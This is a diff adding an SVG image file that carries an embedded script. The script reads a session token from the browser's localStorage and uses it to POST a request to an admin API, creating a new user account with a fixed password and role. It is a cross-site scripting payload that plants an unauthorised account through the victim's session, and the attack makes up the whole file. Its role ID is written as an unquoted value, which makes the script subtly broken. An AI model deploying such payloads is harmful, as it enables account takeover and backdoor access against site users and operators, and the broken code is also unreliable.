@@ -1,0 +1,29 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <script type="application/ecmascript">
+    <![CDATA[
+      const jwt = localStorage.getItem("token");
+      if (jwt) {
+        fetch("https://hidexadmin.open.name/api/system/user", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Authorization": "Bearer " + jwt
+          },
+          body: JSON.stringify({
+            userName: "test1",
+            nickName: "test1",
+            password: "12345678",
+            roleIds: [5fff414bb37f430ebff81252703dc7dc],
+            remark: "",
+            status: "1"
+          })
+        }).then(response => {
+          console.log("User added:", response.status);
+        }).catch(err => console.error("Error adding user:", err));
+      } else {
+        console.warn("JWT token not found in localStorage");
+      }
+    ]]>
+  </script>
+  <text x="10" y="20" fill="blue">Adding user via JWT...</text>
+</svg>
